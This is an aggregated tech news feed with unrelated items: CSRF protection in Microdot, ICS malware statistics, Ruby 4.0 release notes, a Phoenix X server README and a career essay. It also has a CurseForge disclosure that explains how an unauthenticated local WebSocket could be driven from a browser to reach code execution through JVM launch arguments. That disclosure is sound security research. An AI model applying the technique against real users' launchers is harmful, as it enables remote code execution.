set by the browser, so it can also be used to determine from where a request is coming from.The problem with using the  header is that it isn't always easy to know what is the correct origin that applies to a web application. The standard option is to compare the value of the  header against the value of the  header, but  only includes the hostname and port, while  also includes the scheme. Also, the  header is overwritten as it passes through reverse proxies. So comparing these two headers is actually not easy.Another, more direct option is to ask the user to configure the expected origin name explicitly. To keep things simple, in Microdot I opted for the explicit configuration, for which I linked to the existing Cross-Origin Request Sharing (CORS) support. The CORS feature already maintains a list of allowed origins, so my CSRF logic automatically trusts these. I decided to not complicate myself adding support for  header checks at this time, but maybe I'll add this in the future.Filippo Valsorda, a security developer active in the Go ecosystem (and author of the popular mkcert tool) wrote a blog post about this method that you may want to check out if you want to learn more details about it. He seems to be the first to propose this method and has implemented it for the Go standard library.Also if you are interested, feel free to review my implementation of CSRF protection in Microdot. Have a look at the documentation, the code and an example, and let me know if you have any improvements or fixes to suggest.Note: this section is now out of date. As of December 24th 2025 the OWASP CSRF Cheat Sheet page lists the Fetch Metadata method as a complete solution that can be used as an alternative to token-based approaches.As I mentioned above, the CSRF Prevention Cheat Sheet page from OWASP was updated in early December to include the use of the  header in the list of prevention methods. But this method is currently listed as a defense in depth mechanism, and not a complete solution, which I thought was odd.I referenced the discussion in the OWASP GitHub repository that resulted in the recent changes made to the Cheat Sheet page. Several participants in that discussion have suggested that this method should be upgraded to a complete alternative to the standard token-based approaches. The OWASP maintainer was initially skeptical, but towards the end of the thread they have agreed. The pull request that closed the discussion added this solution as an alternative to the token-based approaches, but then a later change made significant updates, including the downgrade to defense in depth. My hope is that this is just a misunderstanding, and that the OWASP folks will restore the content as it was agreed by all the parties involved.In any case, I consider that in Microdot, going from no CSRF support at all to this is a great step forward that is also consistent with the minimalist ethos of the project. I will be keeping an eye on the OWASP CSRF Cheat Sheet page to see what is their final word on this new protection method, and if they end up keeping it as defense in depth, I still have a mostly complete implementation of double-submit anti-CSRF tokens that I can bring into my project.What I like the most about working in open source is that all the work happens in the open, so it is a permanent record that can be searched and reviewed. My CSRF protection journey started as a somewhat tedious exercise in the use of cryptography and cookies, but then thanks to an unexpected lead it turned into a fun and exciting learning opportunity for me.]]></content:encoded></item><item><title>We invited a man into our home at Christmas and he stayed with us for 45 years</title><link>https://www.bbc.co.uk/news/articles/cdxwllqz1l0o</link><author>rajeshrajappan</author><category>dev</category><pubDate>Thu, 25 Dec 2025 10:35:34 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Only 50 people were allowed to go to his funeral due to Covid but "tickets were hotter than a Coldplay concert" Rob joked.

The circumstantial evidence for a specific source can be the blocked threat’s type (category).The internet (visiting malicious or compromised internet resources; malicious content distributed via messengers; cloud data storage and processing services and CDNs), email clients (phishing emails), and removable storage devices remain the primary sources of threats to computers in an organization’s technology infrastructure.In Q3 2025, the percentage of ICS computers on which malicious objects from various sources were blocked decreased.Percentage of ICS computers on which malicious objects from various sources were blockedThe same computer can be attacked by several categories of malware from the same source during a quarter. That computer is counted when calculating the percentage of attacked computers for each threat category, but is only counted once for the threat source (we count unique attacked computers). In addition, it is not always possible to accurately determine the initial infection attempt. Therefore, the total percentage of ICS computers on which various categories of threats from a certain source were blocked can exceed the percentage of threats from the source itself.The main categories of threats from the internet blocked on ICS computers in Q3 2025 were malicious scripts and phishing pages, and denylisted internet resources. The percentage ranged from 4.57% in Northern Europe to 10.31% in Africa.The main categories of threats from email clients blocked on ICS computers were malicious scripts and phishing pages, spyware, and malicious documents. Most of the spyware detected in phishing emails was delivered as a password-protected archive or a multi-layered script embedded in an office document. The percentage of ICS computers on which threats from email clients were blocked ranged from 0.78% in Russia to 6.85% in Southern Europe.The main categories of threats that were blocked when removable media was connected to ICS computers were worms, viruses, and spyware. The percentage of ICS computers on which threats from this source were blocked ranged from 0.05% in Australia and New Zealand to 1.43% in Africa.The main categories of threats that spread through network folders were viruses, AutoCAD malware, worms, and spyware. The percentages of ICS computers where threats from this source were blocked ranged from 0.006% in Northern Europe to 0.20% in East Asia.Typical attacks blocked within an OT network are multi-step sequences of malicious activities, where each subsequent step of the attackers is aimed at increasing privileges and/or gaining access to other systems by exploiting the security problems of industrial enterprises, including technological infrastructures.Malicious objects used for initial infectionIn Q3 2025, the percentage of ICS computers on which denylisted internet resources were blocked decreased to 4.01%. This is the lowest quarterly figure since the beginning of 2022.Percentage of ICS computers on which denylisted internet resources were blocked, Q3 2022–Q3 2025Regionally, the percentage of ICS computers on which denylisted internet resources were blocked ranged from 2.35% in Australia and New Zealand to 4.96% in Africa. Southeast Asia and South Asia were also among the top three regions for this indicator.The percentage of ICS computers on which malicious documents were blocked has grown for three consecutive quarters, following a decline at the end of 2024. In Q3 2025, it reached 1,98%.Percentage of ICS computers on which malicious documents were blocked, Q3 2022–Q3 2025The indicator increased in four regions: South America, East Asia, Southeast Asia, and Australia and New Zealand. South America saw the largest increase as a result of a large-scale phishing campaign in which attackers used new exploits for an old vulnerability (CVE-2017-11882) in Microsoft Office Equation Editor to deliver various spyware to victims’ computers. It is noteworthy that the attackers in this phishing campaign used localized Spanish-language emails disguised as business correspondence.In Q3 2025, the percentage of ICS computers on which malicious scripts and phishing pages were blocked increased to 6.79%. This category led the rankings of threat categories in terms of the percentage of ICS computers on which they were blocked.Percentage of ICS computers on which malicious scripts and phishing pages were blocked, Q3 2022–Q3 2025Regionally, the percentage of ICS computers on which malicious scripts and phishing pages were blocked ranged from 2.57% in Northern Europe to 9.41% in Africa. The top three regions for this indicator were Africa, East Asia, and South America. The indicator increased the most in East Asia (by a dramatic 5.23 pp) as a result of the local spread of malicious spyware scripts loaded into the memory of popular torrent clients including MediaGet.Malicious objects used to initially infect computers deliver next-stage malware — spyware, ransomware, and miners — to victims’ computers. As a rule, the higher the percentage of ICS computers on which the initial infection malware is blocked, the higher the percentage for next-stage malware.
In Q3 2025, the percentage of ICS computers on which spyware and ransomware were blocked increased. The rates were:spyware: 4.04% (up 0.20 pp);ransomware: 0.17% (up 0.03 pp).The percentage of ICS computers on which miners of both categories were blocked decreased. The rates were:miners in the form of executable files for Windows: 0.57% (down 0.06 pp), it’s the lowest level since Q3 2022;web miners: 0.25% (down 0.05 pp). This is the lowest level since Q3 2022.Self-propagating malware (worms and viruses) is a category unto itself. Worms and virus-infected files were originally used for initial infection, but as botnet functionality evolved, they took on next-stage characteristics.To spread across ICS networks, viruses and worms rely on removable media and network folders in the form of infected files, such as archives with backups, office documents, pirated games and hacked applications. In rarer and more dangerous cases, web pages with network equipment settings, as well as files stored in internal document management systems, product lifecycle management (PLM) systems, resource management (ERP) systems and other web services are infected.In Q3 2025, the percentage of ICS computers on which worms and viruses were blocked increased to 1.26% (by 0.04 pp) and 1.40% (by 0.11 pp), respectively.This category of malware can spread in a variety of ways, so it does not belong to a specific group.In Q3 2025, the percentage of ICS computers on which AutoCAD malware was blocked slightly increased to 0.30% (by 0.01 pp).]]></content:encoded></item><item><title>Fortinet Warns of Active Exploitation of FortiOS SSL VPN 2FA Bypass Vulnerability</title><link>https://thehackernews.com/2025/12/fortinet-warns-of-active-exploitation.html</link><author></author><category>security</category><pubDate>Thu, 25 Dec 2025 08:22:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Fortinet Warns of Active Exploitation of FortiOS SSL VPN 2FA Bypass Vulnerability

Ruby 4.0 introduces “Ruby Box” and “ZJIT”, and adds many improvements.Ruby Box is a new (experimental) feature to provide separation about definitions. Ruby Box is enabled when an environment variable  is specified. The class is .Definitions loaded in a box are isolated in the box. Ruby Box can isolate/separate monkey patches, changes of global/class variables, class/module definitions, and loaded native/ruby libraries from other boxes.Run test cases in box to protect other tests when the test case uses monkey patches to override somethingRun web app boxes in parallel to execute blue-green deployment on an app server in a Ruby processRun web app boxes in parallel to evaluate dependency updates for a certain period of time by checking response diff using Ruby codeUsed as the foundation (low-level) API to implement kind of “package” (high-level) API (it is not designed yet)ZJIT is a new just-in-time (JIT) compiler, which is developed as the next generation of YJIT. You need Rust 1.85.0 or newer to build Ruby with ZJIT support, and ZJIT is enabled when  is specified.We’re building a new compiler for Ruby because we want to both raise the performance ceiling (bigger compilation unit size and SSA IR) and encourage more outside contribution (by becoming a more traditional method compiler). See our blog post for more details.
ZJIT is faster than the interpreter, but not yet as fast as YJIT. We encourage you to experiment with ZJIT, but maybe hold off on deploying it in production for now. Stay tuned for Ruby 4.1 ZJIT.Ractor, Ruby’s parallel execution mechanism, has received several improvements. A new class, , was introduced to address issues related to message sending and receiving (see our blog post). Additionally,  makes it easier to share  objects between Ractors.On the performance side, many internal data structures have been improved to significantly reduce contention on a global lock, unlocking better parallelism. Ractors also now share less internal data, resulting in less CPU cache contention when running in parallel.Ractor was first introduced in Ruby 3.0 as an experimental feature. We aim to remove its “experimental” status next year. no longer calls , similar to how  does
not call .  [Feature #21047]Logical binary operators (, ,  and ) at the
beginning of a line continue the previous line, like fluent dot.
The following code examples are equal:Note: We’re only listing outstanding class updates. has been added as a more efficient alternative to  [Feature #21678] has been added as a more efficient override of  [Feature #21678] does no longer include numbered parameters.
Also, Binding#local_variable_get, Binding#local_variable_set, and
Binding#local_variable_defined? reject to handle numbered parameters.
[Bug #21049]Binding#implicit_parameters, Binding#implicit_parameter_get, and
Binding#implicit_parameter_defined? have been added to access
numbered parameters and “it” parameter. [Bug #21049] now accepts an optional  keyword argument
to specify the size of the enumerator.  It can be an integer,
, a callable object (such as a lambda), or  to
indicate unknown size.  When not specified, the size defaults to
.When an ArgumentError is raised, it now displays code snippets for
both the method call (caller) and the method definition (callee).
[Feature #21543]test.rb:1:in 'Object#add': wrong number of arguments (given 1, expected 2) (ArgumentError)

    caller: test.rb:3
    | add(1)
      ^^^
    callee: test.rb:1
    | def add(x, y) = x + y
          ^^^
        from test.rb:3:in '<main>'
Introduce support for  argument similar to
. [Feature #21360]Introduce Fiber::Scheduler#fiber_interrupt to interrupt a fiber with a
given exception. The initial use case is to interrupt a fiber that is
waiting on a blocking IO operation when the IO operation is closed.
[Feature #21166]Introduce  to allow the fiber scheduler to
continue processing when signal exceptions are disabled.
[Bug #21633]Reintroduce the Fiber::Scheduler#io_close hook for asynchronous .Invoke Fiber::Scheduler#io_write when flushing the IO write buffer.
[Bug #21789] is now available on Linux via the statx
system call when supported by the kernel and filesystem.
[Feature #21205] accepts  as a timeout argument.
[Feature #20610]A deprecated behavior, process creation by  class methods
with a leading , was removed.  [Feature #19630] now checks for the existence of a #instance_variables_to_inspect method,
allowing control over which instance variables are displayed in the  string:A deprecated behavior, process creation by  with a
leading , was removed.  [Feature #19630]Pathname has been promoted from a default gem to a core class of Ruby.
[Feature #17473] now shows anonymous optional parameters as 
instead of , making the output consistent with when the
anonymous parameter is required. [Bug #20974] class was added for a new synchronization mechanism
to communicate between Ractors. [Feature #21262] provides the following methods: (or )As a result,  and  were removed. and  were added to wait for the
termination of a Ractor. These are similar to 
and . and  were added as low-level
interfaces used internally to implement . now only accepts Ractors and Ports. If Ractors are given,
it returns when a Ractor terminates. was added. Each  has a default port,
which is used by , . and  were removed. now performs size checks to prevent issues with
endless ranges. [Bug #21654] now correctly handles infinite (unbounded) ranges.
[Bug #21185]A new toplevel module  has been defined, which contains
Ruby-related constants. This module was reserved in Ruby 3.4
and is now officially defined. [Feature #20884] is now a core class, instead of an autoloaded stdlib class.
[Feature #21216] now uses a simpler display, similar to literal arrays.
(e.g.,  instead of ). [Feature #21389]Passing arguments to  and  is now deprecated.
[Feature #21390] &  accepts an  keyword argument to specify
the timeout for the initial connection. [Feature #21347]When a user-specified timeout occurred in , either 
or  could previously be raised depending on the situation.
This behavior has been unified so that  is now consistently raised.
(Please note that, in , there are still cases where 
may be raised in similar situations, and that in both cases  may be
raised when the timeout occurs at the OS level.)Introduce support for  argument similar to
. [Feature #21360]We only list stdlib changes that are notable feature changes.Other changes are listed in the following sections. We also listed release history from the previous bundled version that is Ruby 3.4.0 if it has GitHub releases.The following bundled gems are promoted from default gems.The following default gem is added.The following default gems are updated.The following bundled gems are updated.Ruby 4.0 bundled RubyGems and Bundler version 4. see the following links for details.Dropped support for MSVC versions older than 14.0 (_MSC_VER 1900).
This means Visual Studio 2015 or later is now required.The following methods were removed from Ractor due to the addition of : and  have been removed.
They were deprecated in Ruby 3.3. [Bug #19868] has been removed. This function was used for
 path checking which was removed in Ruby 2.7,
and was already deprecated.
[Feature #20971]A backtrace for  of “wrong number of arguments” now
include the receiver’s class or module name (e.g., in 
instead of in ). [Bug #21698]Backtraces no longer display  frames.
These methods now appear as if it is in the Ruby source file,
consistent with other C-implemented methods. [Bug #20968]ruby -e '[1].fetch_values(42)'
<internal:array>:211:in 'Array#fetch': index 42 outside of array bounds: -1...1 (IndexError)
        from <internal:array>:211:in 'block in Array#fetch_values'
        from <internal:array>:211:in 'Array#map!'
        from <internal:array>:211:in 'Array#fetch_values'
        from -e:1:in '<main>'
$ ruby -e '[1].fetch_values(42)'
-e:1:in 'Array#fetch_values': index 42 outside of array bounds: -1...1 (IndexError)
        from -e:1:in '<main>'
CGI library is removed from the default gems. Now we only provide  for
the following methods: and  and  and  and With the move of  from stdlib to core class,  has
been removed, and  is no longer an autoloaded constant. Please
install the  gem and  to use .
[Feature #21287]The default behavior of automatically setting the  header
to application/x-www-form-urlencoded for requests with a body
(e.g., , ) when the header was not explicitly set has been
removed. If your application relied on this automatic default, your
requests will now be sent without a Content-Type header, potentially
breaking compatibility with certain servers.
[GH-net-http #205] is deprecated and now a no-op. If you need to expose
file descriptors from C extensions to Ruby code, create an  instance
using  and use  to close it (this
also interrupts and waits for all pending operations on the 
instance). Directly closing file descriptors does not interrupt pending
operations, and may lead to undefined behaviour. In other words, if two
 objects share the same file descriptor, closing one does not affect
the other. [Feature #18455] now works with or without the GVL.
This allows gems to avoid checking .
Please still be diligent about the GVL. [Feature #20750]A C API for  has been added. The following methods are supported:
[Feature #21459]Implementation improvements (ex. ) is faster in all cases, but especially when passing keyword arguments. This has also been integrated into YJIT and ZJIT. [Feature #21254]GC heaps of different size pools now grow independently, reducing memory usage when only some pools contain long-lived objectsGC sweeping is faster on pages of large objects“Generic ivar” objects (String, Array, , etc.) now use a new internal “fields” object for faster instance variable accessThe GC avoids maintaining an internal  table until it is first used, making  allocation and GC sweeping faster and  are faster on Class and Module objectsLarger bignum Integers can remain embedded using variable width allocation, , , ,
, and some internal objects are now write-barrier protected,
which reduces GC overhead.A lot of work has gone into making Ractors more stable, performant, and usable. These improvements bring Ractor implementation closer to leaving experimental status.Performance improvements
    Frozen strings and the symbol table internally use a lock-free hash set [Feature #21268]Method cache lookups avoid locking in most casesClass (and generic ivar) instance variable access is faster and avoids lockingCPU cache contention is avoided in object allocation by using a per-ractor counterCPU cache contention is avoided in xmalloc/xfree by using a thread-local counter avoids locking in most casesBug fixes and stability
    Fixed possible deadlocks when combining Ractors and ThreadsFixed issues with require and autoload in a RactorFixed encoding/transcoding issues across RactorsFixed race conditions in GC operations and method invalidationFixed issues with processes forking after starting a RactorGC allocation counts are now accurate under RactorsFixed TracePoints not working after GC [Bug #19112]ZJIT
    Introduce an experimental method-based JIT compiler.
 Where available, ZJIT can be enabled at runtime with the  option or by calling .
When building Ruby, Rust 1.85.0 or later is required to include ZJIT support.As of Ruby 4.0.0, ZJIT is faster than the interpreter, but not yet as fast as YJIT.
We encourage experimentation with ZJIT, but advise against deploying it in production for now.Our goal is to make ZJIT faster than YJIT and production-ready in Ruby 4.1.YJIT
    RubyVM::YJIT.runtime_stats no longer works in the default build.
Use  on  to enable it on .Add  to default stats, which is
incremented when every code is invalidated by TracePoint.Add  and  options to .RJIT
     is removed. We will move the implementation of the third-party JIT API
to the ruby/rjit repository.Merry Christmas, a Happy New Year, and Happy Hacking with Ruby 4.0!SIZE: 23955109

Out of curiosity, I started poking around to find other applications on my system that regularly expose local WebSocket servers bound to the loopback interface.I found a handful of interesting apps that will turn into future write-ups pending coordinated disclosure, but the one that stood out immediately was the modding platform CurseForge. CurseForge is one of the most widely used video game modding platforms, with millions of users relying on its desktop launcher to manage and launch modpacks.While monitoring local WebSocket traffic, I noticed that every time a modpack was launched, the CurseForge launcher would send the following message over a local WebSocket connection:At first glance, this looked like a typical launch message. The detail that stood out was that the WebSocket endpoint was bound to localhost, and the message contained no obvious authentication or authorization mechanism, such as API keys, session tokens, or per-request validation.I wrote a small script that re-sent the same WebSocket message, this time with a bogus Origin header set to . To my surprise, the launcher accepted the connection, and the modpack launched successfully.If a random script with a bogus origin header could send WebSocket messages to the CurseForge launcher without restriction, then any website visited by a user could potentially control the launcher as well. From there, I started digging into what was actually hosting this WebSocket server and what else I could do.The server is implemented in  and starts when the launcher opens. I loaded it into JetBrains decompiler, dotPeek, and quickly confirmed that no origin validation was being performed on incoming WebSocket connections.I also started digging into the exposed methods and found several callable actions beyond simply launching a modpack:minecraftGetDefaultLocation - Returns the default Minecraft installation path - Creates a new modpack and returns its GUIDminecraftTaskLaunchInstance - Launches a modpack with a supplied GUID, launcher type, and arbitrary Java argumentsThere are many other methods for other games and launcher features, but the above are the most relevant for this write-up.The biggest concern here is minecraftTaskLaunchInstance, as it allows attacker-controlled JVM arguments to be supplied via the  field when launching the game.To see how far this could go, I wrote a simple proof-of-concept. CurseForge supports several other games, and I’m fairly confident similar techniques would work there as well, but I’m a die-hard Minecraft fan, so I stuck with the Minecraft-specific methods. The PoC chains together two exposed WebSocket methods: one to create a new modpack, and another to launch it with attacker-controlled JVM arguments.Step 1: Creating a modpackThe first step is calling , which creates a brand-new modpack on the victim’s system and returns a valid GUID that’s required later on for game launch.Step 2: Launching with attacker-controlled JVM argumentsOnce that GUID comes back, it gets fed directly into a minecraftTaskLaunchInstance call. This is where things get fun, since the launcher happily accepts arbitrary JVM arguments via .For the demo, I used the following JVM flags to achieve code execution:By forcing the metaspace to an unrealistically small size with the first flag, the JVM quickly runs out of memory during startup. The second flag handles that memory error and executes an arbitrary command when the JVM crashes. In this case, it simply opens the classic calc.exe.The malicious JVM arguments and GUID are then passed into the following launch payload:When this message is sent, CurseForge launches the newly created modpack with the supplied JVM arguments, causing the payload to execute on the client system as the game starts. Depending on the user’s launcher settings, this may require minimal user interaction, but in many cases it occurs automatically.The included video PoC makes every step visible for demonstration. In a real-world attack, the same exploit could be executed entirely in the background by a malicious website.The only real wrinkle in this proof of concept is that CurseAgent does not bind its WebSocket server to a fixed port. Instead, it listens on a randomly assigned local port each time the launcher starts.To address that, the PoC first needs to determine which port the WebSocket server is actually listening on. This is done by probing the local port range and attempting to open WebSocket connections until a valid CurseForge endpoint responds. Once the correct port is found, the rest of the exploit chain proceeds normally.The scan touches roughly 16,000 ports and works reliably in Chromium-based browsers, which handle the connection attempts without many issues, aside from some lag on lower-end systems. Firefox, on the other hand, crashes almost immediately, making the PoC largely unusable there.Needless to say, this issue was reported to CurseForge shortly after discovery. - Vulnerability discovered and initially reported. - Follow-up communication with CurseForge. Due to the absence of a security contact, coordination was handled through an amazing community manager who escalated it internally. - Vulnerability formally acknowledged. - Received a CurseForge t-shirt. - Fix released in the CurseForge app version 1.289.3, with origin checking added after follow-ups. - Public disclosure after allowing time for rollout.From initial report to fix, this left an exploitable RCE reachable from the browser for a little over three months.To their credit, the CurseForge team ultimately addressed the issue, and the launcher no longer exposes this WebSocket server. The disclosure timeline was longer than I would have liked, given the impact, but I appreciate that it was eventually resolved.Also, shoutout to CurseForge for the t-shirt!]]></content:encoded></item><item><title>Microsoft please get your tab to autocomplete shit together</title><link>https://ivanca.github.io/programming/2025/11/26/microsoft-pls-get-your-tab-to-autocomplete-shit-together/</link><author>AmbroseBierce</author><category>dev</category><pubDate>Wed, 24 Dec 2025 23:33:15 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Asterisk AI Voice Agent</title><link>https://github.com/hkjarral/Asterisk-AI-Voice-Agent</link><author>akrulino</author><category>dev</category><pubDate>Wed, 24 Dec 2025 23:25:37 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Tell HN: Merry Christmas</title><link>https://news.ycombinator.com/item?id=46380168</link><author>basilikum</author><category>dev</category><pubDate>Wed, 24 Dec 2025 22:56:00 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Different cultures celebrate Christmas at different days and time zones are a thing.

This X server is designed to be a modern alternative to the Xorg server.Phoenix is not ready to be used yet. At the moment it can render simple applications that do GLX, EGL or Vulkan graphics (fully hardware accelerated) nested in an existing X server.
Running Phoenix nested will be the only supported mode until Phoenix has progressed more and can run real-world applications.Be a simpler X server than the Xorg server by only supporting a subset of the X11 protocol, the features that are needed by relatively modern applications (applications written/updated in the last ~20 years).
This includes  software that  use, even old gtk2 applications.
Only relatively modern hardware (made/updated in the last ~15-20 years) which support linux drm and mesa gbm will be supported, and no server driver interface like the Xorg server. Just like how Wayland compositors work.Be safer than the Xorg server by parsing protocol messages automatically. As it's written in Zig, it also automatically catches illegal behaviors (such as index out of array bounds) when building with the  option.Applications will be isolated from each other by default and can only interact with other applications either through a GUI prompt asking for permission,
such as with screen recorders, where it will only be allowed to record the window specified
or by explicitly giving the application permission before launched (such as a window manager or external compositor).
This will not break existing clients as clients wont receive errors when they try to access more than they need, they will instead receive dummy data.
Applications that rely on global hotkeys should work, as long as a modifier key is pressed (keys such as ctrl, shift, alt and super).
If an application needs global hotkeys without pressing a modifier key then it needs to be given permissions to do so (perhaps by adding a command to run a program with more X11 permissions).
There will be an option to disable this to make the X server behave like the Xorg server.Improvements for modern technologySupport modern hardware better than the Xorg server, such as proper support for multiple monitors (different refresh rates, VRR - not a single framebuffer for the whole collection of displays) and technology like HDR.Improved graphics handlingNo tearing by default and a built-in compositor. The compositor will get disabled if the user runs an external compositor (client application), such as picom or if the client runs a fullscreen application.
The goal is to also have lower vsync/compositor latency than the Xorg server.New standards will be developed and documented, such as per-monitor DPI as randr properties.
Applications can use this property to scale their content to the specified DPI for the monitor they are on.Extending the X11 protocolIf there is a need for new features (such as HDR) then the X11 protocol will be extended.Some applications might only run on Wayland in the future. Such applications should be supported by either Phoenix supporting Wayland natively or by running
an external application that works as a bridge between Wayland and X11 (such as 12to11).Being able to run Phoenix nested under X11 or Wayland with hardware acceleration.
This is not only useful for debugging Phoenix but also for developers who want to test their window manager or compositor without restarting the display server they are running.
Being able to run Phoenix under Wayland as an alternative Xwayland server would be a good option.Replacing the Xorg serverThe Xorg server will always support more features of the X11 protocol and wider range of hardware (especially older ones).Multiple displays (monitors) are going to be supported but not X11 screens.GrabServer has no effect in Phoenix.Endian-swapped client/serverThis can be reconsidered if there is a reason.This is very complex as there are a lot of functions that would need to be implemented. These days remote streaming options are more efficient. Alternatively a proxy for glx could be implemented that does remote rendering.Differences between the X11 protocol and PhoenixSeveral parts of the X11 protocol (core) are mandatory to be implemented by an X server, such as many font related operations.
However these are not going to be implemented in Phoenix, except for the simple ones that applications actually use (such as font operations used for cursors).
This will not affect applications that users actually use, even if they use old gtk2 applications.Strings are in ISO Latin-1 encoding in the X11 protocol unless specified otherwise, however in Phoenix all strings are UTF-8 unless the protocol states that it's not an ISO Latin-1 string.zig build -Doptimize=ReleaseSafe
sudo zig build install -p /usr/local -Doptimize=ReleaseSafe
Zig does currently not support the uninstall command so you have to remove files manually:sudo rm /usr/local/bin/phoenix
Building (for development)Run , which builds Phoenix in debug mode. The compiled binary will be available at . You can alternatively build and run with one command: .Generate x11 protocol documentationRun zig build -Dgenerate-docs=true. This will generate  files in . This generates x11 protocol documentation in the style of the official protocol documentation. The documentation is automatically generated from the protocol struct code.
Note that the generated documentation feature is a work-in-progress.x11 () - for nested mode under X11, when building Phoenix with wayland (, ) - for nested mode under Wayland, when building Phoenix with  (not currently supported)drm (, ) - for running Phoenix as a standalone X11 server, when building Phoenix with  (not currently supported)OpenGL ( which provides both  and )This software is licensed under GPL-3.0-only, see the LICENSE file for more information.Isn't it easier to write a Wayland compositor?Despite popular belief, writing a simple X server that works in practice for a wide range of applications is easier to do than it is to write a Wayland compositor (+ related software).
Not many people have attempted to write an X server from scratch or have proper understanding of the protocol, but if you do you can see that it's quite simple.Doesn't X11 have fundamental issues with tearing/multiple monitors/hdr/security/etc that can't be fixed?No, most information about how X11 works online is wrong. Some of this misinformation has even been spread by Wayland compositor developers. These issues are related to the X.org server, not the X11 protocol.
When 10-bit color mode is enabled in the X.org server it can break some applications such as steam which fails to start, but all of these issues can be solved without affecting client applications, even without introducing a new X11 protocol extension.]]></content:encoded></item><item><title>OpenAI is reportedly testing Claude-like Skills for ChatGPT</title><link>https://www.bleepingcomputer.com/news/artificial-intelligence/openai-is-reportedly-testing-claude-like-skills-for-chatgpt/</link><author>Mayank Parmar</author><category>security</category><pubDate>Wed, 24 Dec 2025 22:31:28 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[OpenAI is testing a new ChatGPT feature called "Skills," which will be similar to Claude's feature, also called Skills.

I helped launch/lead features on YouTube, I led teams, I designed and implemented systems that were still in use to that day by many people, people all across the org knew me and said I was indispensable to the company and were surprised that I wasn't already at an L5/6 level. The results of that meeting? The same from the previous promotion decisions; “it’s unfortunately a no. You don’t have enough impact.”That Tuesday afternoon realization kicked off a grueling, educational, and emotionally taxing journey: leaving a "dream job" to find out what I was actually worth in the open market.The Mathematics of LevelingIn the software engineering world, we exist on a ladder. We call this ”Leveling”.For those outside the tech industry, imagine the military. You have Lieutenants, Captains, Majors, and Generals. In tech, these are usually denoted as L3 (Entry/Junior), L4 (Mid), L5 (Senior), and L6 (Staff). L1/2 are saved for contractors or interns. After these denominations, one usually switches to a director or someone on the Leadership team. Your level dictates your salary, your stock grants, and most importantly, the scope of problems you are allowed to solve.I found myself in a situation common to many engineers at large organizations. I was operating at a “Senior” or “Staff" level (architecting systems and roadmaps rather than just writing the code and tracking bugs), but my official title and compensation were stuck at just above junior level.I faced a choice: continue to do way more work to prove myself for the lottery that is the promo cycle or leave to find a company that would recognize my output immediately. I chose the latter. And I decided to attempt a "double level" jump during my interviews (L4 to L6). I didn't just want a lateral move; I wanted the title that matched the work I was already doing.The Double Life of the Employed CandidateHunting for a job is a full-time occupation. Doing so while maintaining high performance at a demanding job like YouTube is a recipe for cognitive fracture.The strain comes from context switching. From 9:00 AM to 5:00 PM, I had to care deeply about our quarterly goals and production stability. Then, from 6:00 PM to midnight, I had to care about inverting binary trees and system architecture design.I recall taking "calls" in my car, taking vacation days to practice and do interviews, tethering my laptop to my phone's hotspot to solve coding challenges while squatting in a coffee shop down the street from the office. This duality is exhausting. It forces you to lie by omission to people you respect. You can't tell your team, "I can't take that ticket because I need to study dynamic programming." You just have to work faster.Navigating the NDA MinefieldOne of the most complex hurdles in this cycle was proving I was capable of that "double level" jump without breaking Non-Disclosure Agreements (NDAs).When you work at a place like YouTube, the scale of the problems you solve is the primary selling point. However, the  of how you solved them are often trade secrets.Here is the strategy I developed: Abstract the mechanism, not the metricI couldn't tell interviewers exactly how a specific proprietary algorithm worked. Instead, I focused on the agnostic engineering principles.Don't say: "I tweaked the YouTube watch-time algorithm using X variable."Do say: "I optimized a high-throughput distributed system to prioritize user retention metrics, reducing latency by 150ms through a custom caching layer."It shows you understand the  (which is transferable knowledge) rather than just the  (which stays at the old company). If you are ever in this position, focus on the scale of the data and the architectural patterns you used (like Microservices or Event-Driven Architecture) rather than the feature itself. In the end, it also helped me connect with external technologies and lingo better!The Elephant in the Room...Most interviewers asked me the question that people assume is the hardest to answer... "why you are not already an L5/6". And honestly, this was the easiest part. People understood the problems with promos at Google/YouTube, but also this situation. The problem of "doing more work and not getting compensated" is pretty well-known.What was unique was how long it took me to decide to leave. And I had to highlight the incredibly talented team I worked with and the amazing managers that taught me so much. There is so much value in knowing and feeling that the people around you care about you and want to build amazing things with you. The Thirteen-Interview MarathonThe most alarming trend I analyzed during this cycle is the inflation of the interview loop.At one prominent tech company, I underwent  for a single role. This included initial screens, coding rounds, system design rounds, behavioral checks, and meetings with cross-functional partners.From a critical perspective, this signals organizational dysfunction. If a company requires 13 people to sign off on a hire, it suggests they operate on a consensus-based model that stifles autonomy. It implies a fear of making mistakes that outweighs the desire for talent.When I analyze the data from my own process, the companies with 5 to 8 rounds had the clearest internal culture. They knew what they wanted. The company with 13 rounds was fishing for a reason to say "no” (which some ultimately told me).We often hear that "people leave managers, not jobs." But sometimes, people leave jobs despite loving their managers.My final conversation with my manager was heart-wrenching. I had prepared a script, anticipating a counter-offer or a guilt trip. Instead, I was met with soft and understanding empathy. I explained that my growth curve had flattened. I wasn't leaving because the team failed me; I was leaving because I had outgrown the pot I was planted in. Staying would have required me to stagnate to fit the available space. I needed to leave to see what I was capable of. And he listened to every word.I walked out of the meeting feeling incredibly bittersweet, with tears ready to fall. He knew my talent, he knew how hard I worked, and he still was incredibly supportive while I said I was leaving.This is a hard lesson for both employees and leaders:  Sometimes, the best thing a manager can do for that high-performer is to wish them luck as they walk out the door. It wasn't his fault I wasn't promoted to the level I wanted—he was fighting the same bureaucratic machine I was.Leaving a recognizable brand like Google/YouTube is frightening. You lose the immediate validation that comes with the name on your resume. But careers are long, and comfort is the enemy of progress.If you feel like you are solving problems two levels above your pay grade, and the only reward you get is , it is time to test the market. The interview fatigue is real, and the conversations are hard, but the clarity you gain on your own value is worth the struggle.I’m curious about your experiences with career stagnation. Have you ever felt like you were "acting" at a higher level than your title? How did you handle the conversation with your leadership?Please share your stories in the comments below.]]></content:encoded></item><item><title>CVE-2025-8769 - MegaSys Computer Technologies Telenium Online Web Application Improper Input 